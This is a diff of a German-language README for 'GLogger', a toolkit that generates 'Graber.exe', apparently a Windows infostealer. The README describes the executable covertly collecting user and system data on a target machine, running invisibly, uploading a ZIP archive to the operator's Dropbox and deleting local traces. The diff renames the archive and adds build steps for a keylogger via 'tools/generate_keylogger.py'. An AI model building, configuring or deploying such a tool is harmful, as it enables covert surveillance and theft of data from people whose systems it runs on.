@@ -2,7 +2,7 @@
 
 The GLogger ist ein Toolkit zur Erstellung von Datenerfassungs-Anwendungen für Windows. Es bietet eine einfache Kommandozeilen-Oberfläche, um Python-Skripte zu generieren und sie in eigenständige `.exe`-Dateien zu kompilieren. Die Hauptanwendung `Graber` sammelt eine Vielzahl von Benutzer- und Systemdaten und lädt sie zur Analyse in ein privates Dropbox-Konto hoch.
 
-**Wichtiger Hinweis:** Der Name des hochgeladenen Archivs in Dropbox ist `FScriptExport.zip`.
+**Wichtiger Hinweis:** Der Name des hochgeladenen Archivs in Dropbox ist `G_LoggerExport.zip`.
 
 ---
 
@@ -27,7 +27,7 @@ Die generierte `Graber.exe` führt die folgenden Aktionen auf dem Zielsystem aus
     -   Liste der laufenden Prozesse
     -   Aktive Netzwerkverbindungen und IP-Adressen
     -   Liste der installierten Programme (aus der Windows-Registry)
--   **Archivierung & Upload**: Fasst alle gesammelten Daten in einer `FScriptExport.zip`-Datei zusammen.
+-   **Archivierung & Upload**: Fasst alle gesammelten Daten in einer `G_LoggerExport.zip`-Datei zusammen.
 -   **Dropbox-Upload**: Lädt die ZIP-Datei in das Stammverzeichnis des konfigurierten Dropbox-Kontos hoch.
 -   **Säuberung**: Löscht nach erfolgreichem Upload alle lokal gesammelten Dateien und das ZIP-Archiv, um Spuren zu minimieren.
 
@@ -108,11 +108,40 @@ Nachdem die Konfiguration abgeschlossen ist, können Sie die ausführbare Datei 
     python glogger_ui.py
     ```
 
-2.  **Graber generieren**:
+2. **Graber generieren**:
+
     -   Wählen Sie im Menü die Option **"2. Graber"**.
+
     -   Das Skript generiert nun die `Graber.py`-Datei und kompiliert sie mit PyInstaller zu einer einzigen `.exe`-Datei.
 
-3.  **Ergebnis finden**:
+
+
+### Keylogger Generierung
+
+
+
+Um die ausführbare Datei des Keyloggers (`Graber.exe`) zu generieren, führen Sie das Skript `glogger_ui.py` aus und wählen Sie die entsprechende Option.
+
+
+
+Alternativ können Sie das Skript `tools/generate_keylogger.py` direkt ausführen, um den Keylogger zu erstellen. Beachten Sie, dass dies möglicherweise weitere Konfigurationsschritte erfordert, die normalerweise über die UI (`glogger_ui.py`) gehandhabt werden.
+
+
+
+**Beispiel für direkte Generierung:**
+
+
+
+```bash
+
+python tools/generate_keylogger.py
+
+```
+
+
+
+3. **Ergebnis finden**:
+
     -   Die fertige ausführbare Datei befindet sich im `dist/`-Ordner: `dist/Graber.exe`.
 
-Diese `Graber.exe` ist die eigenständige Anwendung, die auf einem Ziel-Windows-System ausgeführt werden kann. Beim Ausführen arbeitet sie unsichtbar im Hintergrund und lädt am Ende die `FScriptExport.zip` in Ihr Dropbox-Konto hoch.
+Diese `Graber.exe` ist die eigenständige Anwendung, die auf einem Ziel-Windows-System ausgeführt werden kann. Beim Ausführen arbeitet sie unsichtbar im Hintergrund und lädt am Ende die `G_LoggerExport.zip` in Ihr Dropbox-Konto hoch.
